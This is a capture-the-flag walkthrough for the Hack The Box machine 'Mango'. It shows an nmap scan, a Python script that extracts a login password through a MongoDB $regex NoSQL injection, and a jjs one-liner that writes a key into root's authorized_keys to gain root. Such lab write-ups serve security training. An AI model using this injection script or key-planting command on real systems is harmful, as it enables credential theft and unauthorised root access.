# Mango walkthrough

Machine ip:  10.10.10.162

Nmap output:

```
root@kali:~/htb# nmap -T4 -p- 10.10.10.162
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 21:47 EDT
Nmap scan report for mango.htb (10.10.10.162)
Host is up (0.040s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

## User

We need to add staging-order.mango.htb to /etc/hosts in ordet to get the login page at port 80.
Mango stay for MongoDb that is the technology used for this login page and PayloadAlltheThing has the right payload for injection on MondoDb.
This machine is vulnerable to an injection able to retrieve credentials from the requests.

This script made the magic:

```
import requests
import urllib3
import string
import urllib

urllib3.disable_warnings()

username="mango"
password=""
u="http://staging-order.mango.htb/"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|','$','&']:
      payload='username=%s&password[$regex]=^%s&login=login' % (username, password + c)
      r = requests.post(u, data = payload, headers = headers,
      verify = False, allow_redirects = False)

      if 'OK' in r.text or r.status_code == 302:
        print("Found one more char : %s" % (password+c))
        password += c
```

I tested the script first with the admin user then with the mango user. Using this passwords with ssh i can get a shell and get the user flag.

## Root

Running linpeas we find jjs highlighted and GFTObins gave the answer on how to get a shell as root.
Just enter your public key and root is yours:

```
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("YOUR PUBLIC KEY");
fw.close();' | jjs
```
